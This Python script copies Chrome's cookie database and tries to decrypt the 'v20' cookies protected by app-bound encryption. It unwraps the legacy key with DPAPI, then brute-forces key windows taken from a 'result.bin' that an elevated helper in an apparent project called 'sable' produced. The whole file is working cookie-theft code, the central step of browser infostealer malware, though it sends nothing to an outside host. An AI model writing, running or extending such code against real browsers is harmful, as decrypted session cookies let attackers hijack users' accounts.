"""Decide whether the 6 v20 cookies need the app-bound key at all.

Tests, in order:
  1. legacy DPAPI key from Local State (os_crypt.encrypted_key), nonce at 0
  2. same key, 32-byte prefix skipped
  3. app-bound keydata windows, nonce at 0 and at 32
  4. raw AES-GCM with every 32-byte window of keydata and both nonce offsets
"""

import base64
import json
import shutil
import sqlite3
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, r"C:\Users\Kuzenee\Desktop\55555\sable")

from Crypto.Cipher import AES

from agent import winapi

PROFILE = Path.home() / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Profile 1"
LOCAL_STATE = PROFILE.parent / "Local State"
RESULT = Path(r"C:\Users\Kuzenee\AppData\Local\Temp\opencode\live-elevated\result.bin")


def legacy_key() -> bytes | None:
    doc = json.loads(LOCAL_STATE.read_text(encoding="utf-8"))
    encoded = doc.get("os_crypt", {}).get("encrypted_key")
    if not encoded:
        return None
    blob = base64.b64decode(encoded)
    if blob.startswith(b"DPAPI"):
        blob = blob[5:]
    return winapi.crypt_unprotect(blob)


def cookie_rows() -> list[tuple[str, str, bytes]]:
    tmp = Path(tempfile.mkdtemp())
    src = PROFILE / "Network" / "Cookies"
    dst = tmp / "Cookies"
    shutil.copy2(src, dst)
    for suffix in ("-wal", "-shm"):
        extra = src.with_name(src.name + suffix)
        if extra.is_file():
            shutil.copy2(extra, dst.with_name(dst.name + suffix))
    connection = sqlite3.connect(str(dst))
    try:
        rows = connection.execute(
            "SELECT host_key, name, encrypted_value FROM cookies"
        ).fetchall()
    finally:
        connection.close()
    return [(host, name, bytes(value)) for host, name, value in rows]


def gcm_ok(key: bytes, payload: bytes, offset: int) -> bool:
    if len(payload) < offset + 12 + 16:
        return False
    nonce = payload[offset:offset + 12]
    body = payload[offset + 12:]
    ciphertext, tag = body[:-16], body[-16:]
    try:
        AES.new(key, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(ciphertext, tag)
    except ValueError:
        return False
    return True


def count(key: bytes, payloads: list[bytes], offset: int) -> int:
    return sum(1 for payload in payloads if gcm_ok(key, payload, offset))


def main() -> int:
    rows = cookie_rows()
    v20 = [value[3:] for _, _, value in rows if value[:3] == b"v20"]
    print(f"cookies={len(rows)} v20={len(v20)}")
    print(f"sample length={len(v20[0]) if v20 else 0}")

    old = legacy_key()
    print(f"legacy key: {'none' if old is None else str(len(old)) + ' bytes'}")
    if old is not None:
        for offset in (0, 32):
            print(f"  legacy @{offset}: {count(old, v20, offset)}/{len(v20)}")

    if not RESULT.is_file():
        print("no app-bound result.bin; stopping")
        return 0
    inner = winapi.crypt_unprotect(RESULT.read_bytes())
    if inner is None:
        print("result.bin did not unwrap under the user store")
        return 0
    size = int.from_bytes(inner[:4], "little")
    rest = inner[4 + size:]
    size2 = int.from_bytes(rest[:4], "little")
    keydata = rest[4:4 + size2]
    print(f"keydata: {len(keydata)} bytes head={keydata[:6].hex()}")

    for offset in (0, 32):
        hits = [start for start in range(0, len(keydata) - 31)
                if count(keydata[start:start + 32], v20, offset) == len(v20)]
        print(f"  keydata windows @{offset}: {hits}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
